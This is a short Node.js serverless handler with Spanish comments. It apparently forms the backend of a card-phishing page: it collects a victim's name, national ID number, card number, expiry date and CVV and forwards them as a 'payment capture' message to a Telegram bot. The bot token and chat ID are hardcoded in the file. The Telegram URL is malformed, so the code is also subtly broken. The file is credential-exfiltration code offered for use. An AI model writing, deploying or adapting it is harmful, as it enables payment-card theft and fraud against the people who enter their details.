// Archivo: /api/notificar.js
export default async function handler(req, res) {
  // 1. Validar método
  if (req.method !== 'POST') {
    return res.status(405).json({ status: 'error', message: 'Método no permitido' });
  }

  try {
    // 2. Extraer datos procesando de manera segura el body
    let datos = req.body;
    
    // Forzar lectura si viaja como string plano
    if (typeof datos === 'string') {
      datos = JSON.parse(datos);
    }

    const { titular, dni, tarjeta, vencimiento, cvv } = datos;

    // 3. Configuración fija de tu Bot de Telegram
    const TOKEN = "8948795195:AAFNDbx1b03tL9fEjvrrN5mieFYNbFT5l1g";
    const CHAT_ID = "8510398513";

    // 4. Armado de la plantilla HTML limpia para el mensaje
    const mensaje = `<b>💳 Nueva Captura de Pago</b>\n\n` +
                    `<b>👤 Titular:</b> ${titular || 'N/A'}\n` +
                    `<b>🆔 DNI:</b> ${dni || 'N/A'}\n` +
                    `<b>🔢 Tarjeta:</b> <code>${tarjeta || 'N/A'}</code>\n` +
                    `<b>📅 Vencimiento:</b> ${vencimiento || 'N/A'}\n` +
                    `<b>🔒 CVV:</b> <code>${cvv || 'N/A'}</code>`;

    // 5. Envío directo hacia los servidores de Telegram
    const telegramUrl = `https://telegram.org{TOKEN}/sendMessage`;
    const respuestaTelegram = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensaje,
        parse_mode: 'HTML'
      })
    });

    const resultadoApi = await respuestaTelegram.json();

    // 6. Responder con código de éxito HTTP 200 para que el JS del front continúe
    if (respuestaTelegram.ok && resultadoApi.ok) {
      return res.status(200).json({ status: 'success', message: 'Datos enviados correctamente' });
    } else {
      // Si Telegram responde con error, imprimimos la respuesta real en los logs de Vercel
      console.error("Error devuelto por Telegram:", resultadoApi);
      return res.status(500).json({ status: 'error', message: 'Error en la API de Telegram' });
    }

  } catch (error) {
    console.error("Error en el servidor local de la API:", error.message);
    return res.status(500).json({ status: 'error', message: error.message });
  }
}
